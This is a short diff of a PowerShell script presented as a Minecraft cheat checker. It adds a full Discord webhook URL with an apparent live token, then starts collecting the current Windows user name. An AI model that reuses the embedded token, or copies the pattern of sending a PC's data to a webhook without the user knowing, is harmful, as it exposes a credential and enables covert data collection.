@@ -1,7 +1,7 @@
 # ====================================================================
 #          ULTRA MINECRAFT CHECKER PRO (JAR, EXE, ARCHIVES & DLL)
 # ====================================================================
-$webhook_url = "https://discord.com"
+$webhook_url = "https://discord.com/api/webhooks/1565015662324097214/M_mLlWyFfljXceX_KcWJ3wISOxO--Lr60YGKybbu6afUWYeLgn_BQMgkPfawHIThrTpC"
 
 # 1. Инициализация и сбор базовых данных
 $pc_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
